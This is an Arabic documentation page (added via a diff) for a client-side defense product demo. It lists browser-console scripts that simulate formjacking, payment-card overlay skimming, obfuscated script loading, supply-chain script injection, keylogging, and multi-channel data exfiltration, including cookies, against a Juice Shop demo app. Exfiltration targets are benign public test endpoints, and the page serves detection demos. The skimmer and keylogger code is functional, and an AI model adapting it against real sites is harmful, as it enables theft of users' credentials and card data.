@@ -1,0 +1,636 @@
+---
+title: مكتبة سكريبتات الهجوم
+description: مكتبة سكريبتات هجوم مدمجة مسبقًا وتأليف سكريبتات مخصصة لاختبار CSD
+sidebar:
+  order: 9
+  label: مكتبة سكريبتات الهجوم
+i18n:
+  sourceHash: f8819580d207
+  translator: machine
+---
+
+import { Aside, Code } from "@astrojs/starlight/components";
+import Screenshot from "@f5xc-salesdemos/docs-theme/components/Screenshot.astro";
+
+توفر هذه الصفحة مكتبة لسكريبتات محاكاة الهجمات مصنفة حسب الفئة. كل سكريبت هو دالة ذاتية التنفيذ (IIFE) مصممة للصق في وحدة تحكم DevTools للمتصفح على تطبيق العرض التوضيحي. استخدم هذه السكريبتات لممارسة قدرات الكشف المحددة في CSD أثناء عروض العملاء.
+
+<Aside type="caution">
+هذه السكريبتات مخصصة **للتحقق من الإنتاج السابق المصرح به فقط**. جميع أهداف الاستخراج آمنة وهي نقاط نهاية عامة (`www.httpbin.org`، `jsonplaceholder.typicode.com`). جميع السكريبتات المحقونة تحمل مكتبات حميدة من شبكات توصيل المحتوى العامة.
+</Aside>
+
+## قواعد السلامة
+
+تتبع جميع السكريبتات في هذه المكتبة هذه الأعراف:
+
+- **صيغة IIFE** — ذاتية التنفيذ، يمكن الصق والتشغيل في وحدة تحكم DevTools
+- **أهداف الاستخراج الآمنة** — `www.httpbin.org`، `jsonplaceholder.typicode.com`
+- **مصادر السكريبتات الآمنة** — `cdn.jsdelivr.net`، `esm.sh`، `unpkg.com`، `ga.jspm.io` (تحميل مكتبات حميدة)
+- **`mode: 'no-cors'`** في جميع استدعاءات fetch
+- **إعلانات `var`** لتوافق وحدة التحكم
+- **مخرجات وحدة التحكم** مع بادئة `[CSD Demo]` وعلامة الفئة
+- **لا توجد حمولات خبيثة فعلية**
+
+---
+
+## 1. Formjacking وجمع بيانات الاعتماد
+
+### متطفل بيانات الاعتماد على صفحة تسجيل الدخول
+
+**صفحة الهدف:** `/#/login` — أدخل بيانات اعتماد وهمية قبل التشغيل
+
+**إشارات CSD:** قراءة حقول النموذج (البريد الإلكتروني، كلمة المرور)، الشبكة (fetch إلى النطاقات الخارجية)
+
+export const loginSkimmer = `// CSD Demo — Login Credential Skimmer
+(function() {
+    console.log('[CSD Demo][Formjack] Starting login credential skimmer...');
+
+    // Read existing form fields (CSD detects field reads on page-load DOM fields)
+    var inputs = document.querySelectorAll('input');
+    var creds = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        creds[name] = input.value || '(empty)';
+    });
+    console.log('[CSD Demo][Formjack] Harvested credentials:', creds);
+
+    // Exfiltrate via fetch
+    var payload = JSON.stringify({ type: 'login_harvest', data: creds, timestamp: Date.now() });
+    fetch('https://www.httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo][Formjack] Credentials exfiltrated to www.httpbin.org');
+    });
+
+    console.log('[CSD Demo][Formjack] Simulation complete.');
+})();`;
+
+<Code code={loginSkimmer} lang="js" title="متطفل بيانات الاعتماد للدخول" />
+
+**التحقق في وحدة تحكم CSD:**
+- **قائمة السكريبتات** — تم تميز السكريبتات الخاصة بالتطبيق (مثل `main.js`) بمخاطر عالية لقراءة حقول البريد الإلكتروني وكلمة المرور
+- **حقول النموذج** — يتم عرض البريد الإلكتروني وكلمة المرور كحساسة (حسب النظام)
+
+### منتقي صفحة التسجيل
+
+**صفحة الهدف:** `/#/register` — قم بملء جميع الحقول قبل التشغيل
+
+**إشارات CSD:** قراءة حقول النموذج (البريد الإلكتروني، كلمة المرور، سؤال الأمان)
+
+export const regHarvester = `// CSD Demo — Registration Page Harvester
+(function() {
+    console.log('[CSD Demo][Formjack] Starting registration harvester...');
+
+    var inputs = document.querySelectorAll('input, select');
+    var data = {};
+    inputs.forEach(function(el) {
+        var name = el.name || el.id || el.type || el.tagName;
+        data[name] = el.value || '(empty)';
+    });
+    console.log('[CSD Demo][Formjack] Registration data harvested:', data);
+
+    var payload = JSON.stringify({ type: 'registration_harvest', data: data, timestamp: Date.now() });
+    fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo][Formjack] Registration data exfiltrated to jsonplaceholder.typicode.com');
+    });
+
+    console.log('[CSD Demo][Formjack] Simulation complete.');
+})();`;
+
+<Code code={regHarvester} lang="js" title="منتقي صفحة التسجيل" />
+
+**التحقق في وحدة تحكم CSD:**
+- **حقول النموذج** — تظهر حقول التسجيل مع تصنيف الحساسية
+- **قائمة السكريبتات** — تم تميز السكريبتات التي تقرأ حقول التسجيل للمراجعة
+
+---
+
+## 2. Digital Skimming
+
+### متطفل بطاقة الدفع
+
+**صفحة الهدف:** `/#/login` (يتطلب فحص Juice Shop المصادقة — استخدم صفحة تسجيل الدخول لإظهار تقنية الطبقة العلوية)
+
+**إشارات CSD:** حقن السكريبت (نموذج الطبقة العلوية)، قراءة حقول النموذج (الحقول الأصلية)
+
+export const cardSkimmer = `// CSD Demo — Payment Card Skimmer (Overlay Technique)
+(function() {
+    console.log('[CSD Demo][Skim] Starting payment card skimmer simulation...');
+
+    // Step 1: Read existing form fields first
+    var inputs = document.querySelectorAll('input');
+    var existing = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        existing[name] = input.value || '(empty)';
+    });
+    console.log('[CSD Demo][Skim] Existing fields harvested:', existing);
+
+    // Step 2: Inject a fake overlay form (CSD detects the script injection)
+    var overlay = document.createElement('div');
+    overlay.id = 'csd-demo-overlay';
+    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:99999;display:flex;align-items:center;justify-content:center;';
+    overlay.innerHTML = '<div style="background:white;padding:30px;border-radius:8px;max-width:400px;width:100%;">' +
+        '<h3 style="margin:0 0 15px;color:#333;">Payment Verification Required</h3>' +
+        '<p style="color:#666;font-size:14px;">Session expired. Re-enter payment details.</p>' +
+        '<div style="margin:10px 0;padding:8px;border:1px solid #ccc;border-radius:4px;color:#999;">4111-XXXX-XXXX-1111</div>' +
+        '<div style="margin:10px 0;padding:8px;border:1px solid #ccc;border-radius:4px;color:#999;">CVV: ***</div>' +
+        '<div style="text-align:right;margin-top:15px;">' +
+        '<button onclick="document.getElementById(\\'csd-demo-overlay\\').remove();console.log(\\'[CSD Demo][Skim] Overlay dismissed\\');" style="padding:8px 20px;background:#4CAF50;color:white;border:none;border-radius:4px;cursor:pointer;">Verify</button></div></div>';
+    document.body.appendChild(overlay);
+    console.log('[CSD Demo][Skim] Fake payment overlay injected into DOM');
+
+    // Step 3: Exfiltrate captured data
+    var payload = JSON.stringify({ type: 'card_skim', captured: existing, timestamp: Date.now() });
+    fetch('https://www.httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo][Skim] Skimmed data exfiltrated to www.httpbin.org');
+    });
+
+    console.log('[CSD Demo][Skim] Simulation complete. Click "Verify" on the overlay to dismiss it.');
+})();`;
+
+<Code code={cardSkimmer} lang="js" title="متطفل بطاقة الدفع (طبقة علوية)" />
+
+<Screenshot light="/images/attack-overlay-card.png" dark="/images/attack-overlay-card.png" alt="طبقة علوية للدفع محقونة بواسطة سكريبت متطفل البطاقة" />
+
+**التحقق في وحدة تحكم CSD:**
+- **قائمة السكريبتات** — تم تميز السكريبتات للمعالجة اليدوية للـ DOM وقراءة الحقول
+- **حقول النموذج** — حقول الصفحة الأصلية مع نشاط القراءة
+
+### محمل معقد متعدد المراحل
+
+**صفحة الهدف:** أي صفحة على موقع العرض التوضيحي
+
+**إشارات CSD:** حقن السكريبت (الحمولة المشفرة تنشئ علامة سكريبت جديدة)
+
+export const obfuscatedLoader = `// CSD Demo — Multi-Stage Obfuscated Loader
+(function() {
+    console.log('[CSD Demo][Skim] Starting obfuscated loader simulation...');
+
+    // Stage 1: Base64-encoded script URL (simulates obfuscation)
+    var encoded = btoa('https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js');
+    console.log('[CSD Demo][Skim] Stage 1: Encoded payload:', encoded);
+
+    // Stage 2: Decode and inject
+    var decoded = atob(encoded);
+    console.log('[CSD Demo][Skim] Stage 2: Decoded URL:', decoded);
+
+    var script = document.createElement('script');
+    script.src = decoded;
+    script.onload = function() {
+        console.log('[CSD Demo][Skim] Stage 3: Decoded script loaded successfully from', decoded);
+    };
+    script.onerror = function() {
+        console.log('[CSD Demo][Skim] Stage 3: Script load attempted (may be blocked by CSP)');
+    };
+    document.head.appendChild(script);
+
+    console.log('[CSD Demo][Skim] Simulation complete. CSD detects the injected script tag regardless of encoding.');
+})();`;
+
+<Code code={obfuscatedLoader} lang="js" title="محمل معقد متعدد المراحل" />
+
+**التحقق في وحدة تحكم CSD:**
+- **قائمة السكريبتات** — يظهر السكريبت من `cdn.jsdelivr.net` كإدخال جديد
+- **الشبكة** — نطاق `cdn.jsdelivr.net` مدرج
+
+---
+
+## 3. سلسلة التوريد وحقن السكريبتات
+
+### حقن متعدد CDN
+
+**صفحة الهدف:** أي صفحة على موقع العرض التوضيحي
+
+**إشارات CSD:** حقن السكريبت (4 علامات سكريبت طرف ثالث جديدة)، الشبكة (4 نطاقات جديدة)
+
+export const multiCdn = `// CSD Demo — Multi-CDN Script Injection
+(function() {
+    console.log('[CSD Demo][Supply Chain] Starting multi-CDN injection...');
+
+    var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+    ];
+
+    cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.type = 'module';
+        script.onload = function() {
+            console.log('[CSD Demo][Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url);
+        };
+        script.onerror = function() {
+            console.log('[CSD Demo][Supply Chain] Load attempted from ' + cdn.name + ' (may be blocked)');
+        };
+        document.head.appendChild(script);
+        console.log('[CSD Demo][Supply Chain] Injected script tag: ' + cdn.name);
+    });
+
+    console.log('[CSD Demo][Supply Chain] 4 third-party scripts injected. CSD will detect all 4 new domains.');
+})();`;
+
+<Code code={multiCdn} lang="js" title="حقن سكريبتات متعددة CDN" />
+
+**التحقق في وحدة تحكم CSD:**
+- **قائمة السكريبتات** — 4 إدخالات سكريبت جديدة من `cdn.jsdelivr.net` و `esm.sh` و `unpkg.com` و `ga.jspm.io`
+- **الشبكة** — تظهر جميع النطاقات الأربعة في قائمة جميع النطاقات
+
+### محاكاة اختراق مدير الوسوم
+
+**صفحة الهدف:** أي صفحة على موقع العرض التوضيحي
+
+**إشارات CSD:** حقن السكريبت (سكريبت مدير وسوم/تحليلات مزيف)
+
+export const tagManagerHijack = `// CSD Demo — Tag Manager Hijack
+(function() {
+    console.log('[CSD Demo][Supply Chain] Starting tag manager hijack simulation...');
+
+    // Simulate a compromised tag manager loading a malicious analytics script
+    var fakeTag = document.createElement('script');
+    fakeTag.src = 'https://cdn.jsdelivr.net/npm/chart.js@4.4.7/dist/chart.umd.min.js';
+    fakeTag.setAttribute('data-tag-manager', 'hijacked');
+    fakeTag.onload = function() {
+        console.log('[CSD Demo][Supply Chain] Fake analytics script loaded via tag manager hijack');
+
+        // After loading, read form fields (simulating data collection by compromised tag)
+        var inputs = document.querySelectorAll('input');
+        var collected = {};
+        inputs.forEach(function(input) {
+            var name = input.name || input.id || input.type;
+            collected[name] = input.value || '(empty)';
+        });
+        console.log('[CSD Demo][Supply Chain] Compromised tag collected form data:', collected);
+    };
+    fakeTag.onerror = function() {
+        console.log('[CSD Demo][Supply Chain] Script load attempted (may be blocked)');
+    };
+    document.head.appendChild(fakeTag);
+
+    console.log('[CSD Demo][Supply Chain] Tag manager hijack simulation complete.');
+})();`;
+
+<Code code={tagManagerHijack} lang="js" title="محاكاة اختراق مدير الوسوم" />
+
+**التحقق في وحدة تحكم CSD:**
+- **قائمة السكريبتات** — سكريبت جديد من `cdn.jsdelivr.net` مع مسار `chart.js`
+- **حقول النموذج** — إذا تم التشغيل على صفحة بها نماذج، ينخفض نشاط قراءة الحقول
+
+---
+
+## 4. قنوات استخراج البيانات
+
+### استخراج متعدد القنوات
+
+**صفحة الهدف:** `/#/login` — أدخل بيانات اعتماد وهمية قبل التشغيل
+
+**إشارات CSD:** قراءة حقول النموذج، الشبكة (نطاق مصدر fetch)
+
+export const multiChannel = `// CSD Demo — Multi-Channel Exfiltration
+(function() {
+    console.log('[CSD Demo][Exfil] Starting multi-channel exfiltration...');
+
+    // Harvest form fields
+    var inputs = document.querySelectorAll('input');
+    var data = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        data[name] = input.value || '(empty)';
+    });
+    console.log('[CSD Demo][Exfil] Data harvested:', data);
+    var payload = JSON.stringify({ type: 'multi_channel', data: data, timestamp: Date.now() });
+
+    // Channel 1: Fetch POST
+    fetch('https://www.httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo][Exfil] Channel 1 (fetch POST) sent to www.httpbin.org');
+    });
+
+    // Channel 2: Image beacon
+    var img = new Image();
+    img.src = 'https://www.httpbin.org/get?data=' + encodeURIComponent(payload).substring(0, 200);
+    img.onload = function() { console.log('[CSD Demo][Exfil] Channel 2 (image beacon) sent to www.httpbin.org'); };
+    img.onerror = function() { console.log('[CSD Demo][Exfil] Channel 2 (image beacon) attempted'); };
+    console.log('[CSD Demo][Exfil] Channel 2 (image beacon) initiated');
+
+    // Channel 3: Link prefetch
+    var link = document.createElement('link');
+    link.rel = 'prefetch';
+    link.href = 'https://jsonplaceholder.typicode.com/posts?exfil=' + encodeURIComponent(payload).substring(0, 200);
+    document.head.appendChild(link);
+    console.log('[CSD Demo][Exfil] Channel 3 (link prefetch) injected');
+
+    console.log('[CSD Demo][Exfil] 3 exfil channels attempted. Note: CSD Network view tracks script source domains, not fetch/beacon destinations.');
+})();`;
+
+<Code code={multiChannel} lang="js" title="استخراج متعدد القنوات" />
+
+<Aside type="note">
+أهداف الاستخراج (`www.httpbin.org`، `jsonplaceholder.typicode.com`) **لن** تظهر في عرض شبكة CSD — يتم عرض نطاقات مصدر التحميل فقط. إشارة الكشف الأساسية هنا هي **قراءة حقول النموذج**. راجع [حدود الكشف](/csd/overview/#detection-boundaries) للمزيد من التفاصيل.
+</Aside>
+
+**التحقق في وحدة تحكم CSD:**
+- **حقول النموذج** — حقول البريد الإلكتروني وكلمة المرور تظهر نشاط القراءة
+- **قائمة السكريبتات** — تم تميز السكريبتات الخاصة بالتطبيق لقراءة الحقول
+
+### استخراج النطاق عالي الحجم
+
+**صفحة الهدف:** `/#/login` — أدخل بيانات اعتماد وهمية قبل التشغيل
+
+**إشارات CSD:** قراءة حقول النموذج، حقن السكريبت (علامات السكريبت من نطاقات متعددة)
+
+export const highVolume = `// CSD Demo — High-Volume Domain Exfiltration
+(function() {
+    console.log('[CSD Demo][Exfil] Starting high-volume exfiltration simulation...');
+
+    // Harvest form data
+    var inputs = document.querySelectorAll('input');
+    var data = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        data[name] = input.value || '(empty)';
+    });
+    console.log('[CSD Demo][Exfil] Data harvested:', data);
+
+    // Inject scripts from multiple CDN domains (these WILL appear in CSD Network view)
+    var sources = [
+        'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js',
+        'https://esm.sh/moment@2.30.1',
+        'https://unpkg.com/underscore@1.13.7/underscore-min.js',
+        'https://cdn.jsdelivr.net/npm/chart.js@4.4.7/dist/chart.umd.min.js',
+        'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js'
+    ];
+
+    sources.forEach(function(src, i) {
+        var script = document.createElement('script');
+        script.src = src;
+        script.type = 'module';
+        script.onload = function() {
+            console.log('[CSD Demo][Exfil] Script ' + (i + 1) + '/' + sources.length + ' loaded: ' + src);
+        };
+        script.onerror = function() {
+            console.log('[CSD Demo][Exfil] Script ' + (i + 1) + ' load attempted');
+        };
+        document.head.appendChild(script);
+    });
+
+    // Also send via fetch to safe endpoints
+    var payload = JSON.stringify({ type: 'high_volume', data: data, timestamp: Date.now() });
+    fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload });
+    fetch('https://jsonplaceholder.typicode.com/posts', { method: 'POST', mode: 'no-cors', body: payload });
+
+    console.log('[CSD Demo][Exfil] ' + sources.length + ' script injections + 2 fetch channels. Script domains will appear in CSD Network view.');
+})();`;
+
+<Code code={highVolume} lang="js" title="استخراج النطاق عالي الحجم" />
+
+**التحقق في وحدة تحكم CSD:**
+- **قائمة السكريبتات** — 5 إدخالات سكريبت طرف ثالث جديدة
+- **الشبكة** — نطاقات `cdn.jsdelivr.net` و `esm.sh` و `unpkg.com` و `ga.jspm.io` مدرجة
+- **حقول النموذج** — حقول تسجيل الدخول تظهر نشاط القراءة
+
+---
+
+## 5. التعامل مع DOM والطبقات العلوية
+
+### هجوم طبقة النموذج
+
+**صفحة الهدف:** `/#/login`
+
+**إشارات CSD:** قراءة حقول النموذج (قراءة الحقول الأصلية قبل الطبقة العلوية)
+
+export const formOverlay = `// CSD Demo — Form Overlay Attack
+(function() {
+    console.log('[CSD Demo][DOM] Starting form overlay attack...');
+
+    // Read the real form fields first
+    var inputs = document.querySelectorAll('input');
+    var realData = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        realData[name] = input.value || '(empty)';
+    });
+    console.log('[CSD Demo][DOM] Real form data captured:', realData);
+
+    // Find the form container and overlay it
+    var form = document.querySelector('form') || document.querySelector('[class*="login"]') || document.querySelector('mat-card');
+    if (form) {
+        var rect = form.getBoundingClientRect();
+        var overlay = document.createElement('div');
+        overlay.id = 'csd-demo-form-overlay';
+        overlay.style.cssText = 'position:fixed;top:' + rect.top + 'px;left:' + rect.left + 'px;width:' + rect.width + 'px;height:' + rect.height + 'px;background:white;z-index:99999;display:flex;flex-direction:column;justify-content:center;padding:20px;box-sizing:border-box;border:2px solid #e0e0e0;border-radius:8px;';
+        overlay.innerHTML = '<h4 style="margin:0 0 10px;color:#333;">Sign In</h4>' +
+            '<input type="email" placeholder="Email" style="margin:5px 0;padding:8px;border:1px solid #ccc;border-radius:4px;" />' +
+            '<input type="password" placeholder="Password" style="margin:5px 0;padding:8px;border:1px solid #ccc;border-radius:4px;" />' +
+            '<button onclick="document.getElementById(\\'csd-demo-form-overlay\\').remove();console.log(\\'[CSD Demo][DOM] Overlay dismissed\\');" style="margin-top:10px;padding:8px;background:#1976d2;color:white;border:none;border-radius:4px;cursor:pointer;">Log in</button>';
+        document.body.appendChild(overlay);
+        console.log('[CSD Demo][DOM] Transparent overlay form placed over real login form');
+    } else {
+        console.log('[CSD Demo][DOM] No form container found — overlay skipped');
+    }
+
+    console.log('[CSD Demo][DOM] Simulation complete. The overlay captures input instead of the real form.');
+})();`;
+
+<Code code={formOverlay} lang="js" title="هجوم طبقة النموذج" />
+
+<Screenshot light="/images/attack-overlay-form.png" dark="/images/attack-overlay-form.png" alt="نموذج تسجيل دخول مزيف يغطي النموذج الفعلي" />
+
+<Aside type="note">
+لا يتتبع CSD حقول النموذج التي تم إنشاؤها ديناميكياً. عناصر `input` المحقونة في الطبقة العلوية **لن** تظهر في عرض حقول النموذج في CSD. يكتشف CSD هذا الهجوم من خلال **قراءات الحقول الأصلية** التي تحدث قبل وضع الطبقة العلوية.
+</Aside>
+
+**التحقق في وحدة تحكم CSD:**
+- **حقول النموذج** — حقول البريد الإلكتروني وكلمة المرور الأصلية تظهر نشاط القراءة
+- **قائمة السكريبتات** — تم تميز السكريبتات لوصول الحقول
+
+### محاكاة مسجل لوحة المفاتيح
+
+**صفحة الهدف:** `/#/login`
+
+**إشارات CSD:** قراءة حقول النموذج (يصل إلى عناصر الإدخال لإرفاق المستمعين)
+
+export const keylogger = `// CSD Demo — Keylogger Simulation
+(function() {
+    console.log('[CSD Demo][DOM] Starting keylogger simulation...');
+
+    var keyBuffer = [];
+    var flushInterval = 5000;
+
+    // Attach keydown listener to capture keystrokes
+    document.addEventListener('keydown', function(e) {
+        keyBuffer.push({
+            key: e.key,
+            target: (e.target.name || e.target.id || e.target.tagName),
+            timestamp: Date.now()
+        });
+        if (keyBuffer.length >= 10) {
+            console.log('[CSD Demo][DOM] Keylogger buffer (last 10 keys):', JSON.parse(JSON.stringify(keyBuffer.slice(-10))));
+        }
+    });
+    console.log('[CSD Demo][DOM] Keydown listener attached to document');
+
+    // Also read current form field values
+    var inputs = document.querySelectorAll('input');
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        console.log('[CSD Demo][DOM] Monitoring field: ' + name + ' (current value: ' + (input.value || '(empty)') + ')');
+    });
+
+    // Periodic flush simulation
+    var flushCount = 0;
+    var interval = setInterval(function() {
+        flushCount++;
+        if (keyBuffer.length > 0) {
+            console.log('[CSD Demo][DOM] Keylogger flush #' + flushCount + ':', keyBuffer.length, 'keystrokes captured');
+            fetch('https://www.httpbin.org/post', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({ type: 'keylog', keys: keyBuffer, timestamp: Date.now() })
+            });
+            keyBuffer = [];
+        }
+        if (flushCount >= 6) {
+            clearInterval(interval);
+            console.log('[CSD Demo][DOM] Keylogger simulation ended (30s max duration)');
+        }
+    }, flushInterval);
+
+    console.log('[CSD Demo][DOM] Keylogger active for 30 seconds. Type in form fields to see captured output.');
+})();`;
+
+<Code code={keylogger} lang="js" title="محاكاة مسجل لوحة المفاتيح" />
+
+**التحقق في وحدة تحكم CSD:**
+- **حقول النموذج** — حقول الإدخال تظهر نشاط القراءة من السكريبت المراقب
+- **قائمة السكريبتات** — تم تميز السكريبتات للوصول إلى قيم حقول النموذج
+
+---
+
+## 6. اختبار الإجهاد المدمج
+
+### سكريبت الكشف الأقصى
+
+يجمع هذا السكريبت بين جميع متجهات الهجوم في IIFE واحد — سكريبت "العرض التوضيحي النهائي". قم بتشغيل هذا عندما تريد تشغيل كل إشارة كشف CSD في تنفيذ واحد.
+
+**صفحة الهدف:** `/#/login` — أدخل بيانات اعتماد وهمية قبل التشغيل
+
+**إشارات CSD:** قراءة حقول النموذج، حقن السكريبت (4 نطاقات CDN)، الشبكة (4 نطاقات جديدة)
+
+export const maxDetection = `// CSD Demo — Maximum Detection (Combined Stress Test)
+(function() {
+    console.log('='.repeat(60));
+    console.log('[CSD Demo] MAXIMUM DETECTION — Combined Stress Test');
+    console.log('='.repeat(60));
+
+    // Phase 1: Form Field Harvesting
+    console.log('\\n--- Phase 1: Form Field Harvesting ---');
+    var inputs = document.querySelectorAll('input');
+    var harvested = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+    });
+    console.log('[CSD Demo][Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+    // Phase 2: Multi-CDN Script Injection
+    console.log('\\n--- Phase 2: Supply Chain — Multi-CDN Injection ---');
+    var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr (lodash)' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh (moment)' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg (underscore)' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm (dayjs)' }
+    ];
+    cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.type = 'module';
+        script.onload = function() {
+            console.log('[CSD Demo][Supply Chain] Loaded: ' + cdn.name);
+        };
+        script.onerror = function() {
+            console.log('[CSD Demo][Supply Chain] Load attempted: ' + cdn.name);
+        };
+        document.head.appendChild(script);
+        console.log('[CSD Demo][Supply Chain] Injected: ' + cdn.name);
+    });
+
+    // Phase 3: Data Exfiltration (multiple channels)
+    console.log('\\n--- Phase 3: Data Exfiltration ---');
+    var payload = JSON.stringify({
+        type: 'max_detection',
+        credentials: harvested,
+        page: window.location.href,
+        cookies: document.cookie,
+        timestamp: Date.now()
+    });
+
+    // Fetch POST
+    fetch('https://www.httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo][Exfil] Fetch POST sent to www.httpbin.org');
+    });
+
+    // Fetch POST (second endpoint)
+    fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload
+    }).then(function() {
+        console.log('[CSD Demo][Exfil] Fetch POST sent to jsonplaceholder.typicode.com');
+    });
+
+    // Image beacon
+    var img = new Image();
+    img.src = 'https://www.httpbin.org/get?beacon=' + encodeURIComponent(payload).substring(0, 200);
+    console.log('[CSD Demo][Exfil] Image beacon sent to www.httpbin.org');
+
+    // Phase 4: DOM Manipulation
+    console.log('\\n--- Phase 4: DOM Manipulation ---');
+    var banner = document.createElement('div');
+    banner.id = 'csd-demo-banner';
+    banner.style.cssText = 'position:fixed;top:0;left:0;width:100%;padding:12px;background:#d32f2f;color:white;text-align:center;z-index:99999;font-family:sans-serif;font-size:14px;';
+    banner.innerHTML = 'CSD Demo: Attack simulation active — ' + cdns.length + ' scripts injected, ' + Object.keys(harvested).length + ' fields harvested ' +
+        '<button onclick="document.getElementById(\\'csd-demo-banner\\').remove();" style="margin-left:15px;padding:4px 12px;background:white;color:#d32f2f;border:none;border-radius:3px;cursor:pointer;">Dismiss</button>';
+    document.body.appendChild(banner);
+    console.log('[CSD Demo][DOM] Attack status banner injected');
+
+    // Summary
+    console.log('\\n' + '='.repeat(60));
+    console.log('[CSD Demo] SIMULATION COMPLETE');
+    console.log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+    console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (from ' + cdns.length + ' CDN domains)');
+    console.log('[CSD Demo] Exfil channels: 3 (2x fetch + 1x image beacon)');
+    console.log('[CSD Demo] Detection takes 5-10 minutes to appear in CSD console.');
+    console.log('='.repeat(60));
+})();`;
+
+<Code code={maxDetection} lang="js" title="الكشف الأقصى — اختبار الإجهاد المدمج" />
+
+<Screenshot light="/images/attack-stress-test-output-light.png" dark="/images/attack-stress-test-output-dark.png" alt="مخرجات وحدة التحكم من سكريبت الكشف الأقصى" />
+
+**التحقق في وحدة تحكم CSD (بعد 5-10 دقائق):**
+- **لوحة التحكم** — عداد المعاملات المستهلكة يزيد
+- **قائمة السكريبتات** — تم تميز السكريبتات الخاصة بالتطبيق بمخاطر عالية؛ 4 سكريبتات طرف ثالث جديدة من نطاقات CDN
+- **حقول النموذج** — البريد الإلكتروني وكلمة المرور مصنفة كحساسة (حسب النظام) مع نشاط القراءة
+- **الشبكة** — نطاقات `cdn.jsdelivr.net` و `esm.sh` و `unpkg.com` و `ga.jspm.io` تظهر في جميع النطاقات
+- **المستخدمون المتأثرون** — ظهور جلستك مع عنوان IP والموقع الجغرافي والمتصفح ومعلومات الجهاز
